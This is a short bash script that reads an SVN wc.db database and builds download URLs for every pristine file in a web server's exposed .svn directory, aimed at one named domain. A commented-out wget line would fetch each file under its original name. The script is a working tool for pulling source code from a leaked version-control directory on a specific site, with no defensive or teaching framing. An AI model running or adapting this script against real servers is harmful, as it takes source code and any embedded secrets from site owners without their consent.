#!/bin/bash

# Set the path to the SQLite database file
DB_FILE="wc.db"

for temp in $(sqlite3 $DB_FILE 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES where kind="file";')
do
    path=$(echo $temp | cut -d "|" -f 2 )
    file_name=$(echo $temp | cut -d "|" -f 1 )
    #echo "[+]started downloading $file_name"
    #wget -c "https://dl.lfyanwei.com/$path" -O $file_name 
    echo "https://dl.lfyanwei.com/$path"
done
